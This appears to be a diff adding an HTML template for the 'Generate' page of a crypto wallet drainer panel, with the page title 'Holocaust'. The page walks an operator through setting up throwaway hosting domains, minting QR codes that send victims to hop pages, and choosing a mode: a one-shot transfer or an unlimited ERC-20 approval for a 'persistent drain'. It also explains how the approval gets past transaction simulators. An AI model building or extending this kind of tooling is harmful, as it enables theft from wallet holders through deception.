@@ -1,0 +1,60 @@
+{{define "gen.html"}}<!doctype html>
+<html><head><meta charset="utf-8"><title>Holocaust / Generate</title>
+<style>
+body{font-family:system-ui;background:#0b0f14;color:#e6e8eb;margin:0;padding:28px;max-width:720px;margin-left:auto;margin-right:auto}
+h1{font-size:18px;font-weight:600}h2{font-size:14px;font-weight:600;color:#9fb2c4;margin-top:28px}
+a{color:#4ade80;text-decoration:none}
+label{display:block;font-size:12.5px;color:#8fa2b5;margin:12px 0 4px}
+input,select{background:#0b0f14;border:1px solid #2a3644;color:#e6e8eb;padding:9px;border-radius:6px;font-size:13.5px;width:100%;box-sizing:border-box}
+button{background:#1d4ed8;color:#fff;border:0;padding:10px 18px;border-radius:6px;font-size:13.5px;cursor:pointer;margin-top:16px}
+.mut{color:#8fa2b5;font-size:12.5px;line-height:1.55}
+</style></head><body>
+<h1>Generate fresh QR</h1>
+<p class="mut"><a href="/">&larr; Dashboard</a></p>
+
+<h2>Workflow</h2>
+<p class="mut">1. Buy/claim a fresh free static-hosting domain (Netlify, Vercel,
+GitHub Pages, Cloudflare Pages &mdash; anything serving static files over
+HTTPS). 2. Enter it below with the drain parameters. 3. The panel mints a
+signed token and a ready-to-upload <code>index.html</code>. 4. Upload it to
+the exact path shown. 5. Scan-test the QR yourself before shipping it to a
+target. The QR encodes only <code>https://your-domain/p/&lt;token&gt;</code>
+&mdash; every wallet sees a normal https link, and the wallet handoff happens
+through the vendor's own deeplink domains.</p>
+
+<form method="post" action="/generate">
+<label>Static hosting domain (deep-link hop)</label>
+<input name="domain" placeholder="https://your-fresh-domain.netlify.app" required>
+
+<label>Chain</label>
+<select name="chain">
+{{$recv := .Recv}}
+{{range .List}}<option value="{{.ID}}">{{.Name}}{{if index $recv .ID}} &#10003;{{end}}</option>{{end}}
+</select>
+
+<label>Mode</label>
+<select name="mode">
+<option value="pay">pay &mdash; one-shot transfer (USDT default / native / SPL)</option>
+<option value="approve">approve &mdash; MaxUint256 allowance (EVM only, persistent drain)</option>
+</select>
+
+<label>Token contract (leave blank = USDT/USDC default for the chain; SPL mint for Solana)</label>
+<input name="contract" placeholder="0x... (EVM) / TR... token id / SPL mint">
+
+<label>Amount (pay mode only, token units, e.g. 49.99)</label>
+<input name="amount" placeholder="49.99">
+
+<label>Memo (Trust Wallet payment route only; optional)</label>
+<input name="memo" placeholder="optional memo / reference">
+
+<button type="submit">Generate QR + hop page</button>
+</form>
+
+<p class="mut" style="margin-top:22px">Persistence note: approve-mode executes
+the standard ERC-20 <code>approve(spender, 2^256-1)</code> inside the victim's
+own wallet dApp browser, with your receiving EOA as spender. No drainer
+contract is deployed, so transaction simulators see a plain ERC-20 approval
+to an unbudgeted EOA &mdash; the same UI pattern as legitimate airdrop
+verifiers. Drain later with plain <code>transferFrom</code> at zero gas cost
+to you.</p>
+</body></html>{{end}}
